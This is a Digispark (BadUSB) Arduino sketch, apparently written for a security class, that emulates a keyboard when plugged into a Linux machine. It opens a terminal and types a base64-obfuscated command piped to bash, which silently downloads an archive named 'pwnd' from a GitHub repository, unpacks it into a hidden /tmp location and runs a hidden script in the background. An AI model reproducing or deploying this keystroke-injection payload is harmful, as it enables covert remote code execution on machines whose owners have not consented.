#define LED_BUILTIN 1
#include "DigiKeyboard.h"
/**
 *
 * @author       Muhammad Nur Irsyad
 * @id              1807422020
 * @class         CCIT SEC 8 (TMJ)
 */
bool passed = false;
//----------
void setup() {
    pinMode(LED_BUILTIN, OUTPUT);    
    digitalWrite(LED_BUILTIN, HIGH);
    //----------
    DigiKeyboard.sendKeyStroke(0); delay(2000);        
    DigiKeyboard.sendKeyStroke(KEY_F2 , MOD_ALT_LEFT);
    DigiKeyboard.sendKeyStroke(0); delay(1000);        
    DigiKeyboard.println("gnome-terminal -e '/bin/bash -i -c \"base64 -d <<< IyEvYmluL2Jhc2gKIy0tLS0tLS0tLS0Kd2dldCAtcSAtTyAvdG1wLy5hIGh0dHBzOi8vZ2l0aHViLmNvbS9ob3Rwb3Rjb29raWUvbG9nNHNoZWxsLXdoaXRlLWJveC9yYXcvbWFpbi9yZWQvcGF5bG9hZC9wd25kLnRhci5neiAmIHdhaXQKdGFyIC14ZiAvdG1wLy5hIC1DIC90bXAvICYgd2FpdApiYXNoIC90bXAvLmNvb2tpMy5zaCAtciAmIGRpc293bg== | bash\"'");    
    //----------
    passed = true;
}

void loop() {
    if (passed) {
        digitalWrite(LED_BUILTIN, LOW); delay(100);            
        digitalWrite(LED_BUILTIN, HIGH); delay(125);                                              
     }
}
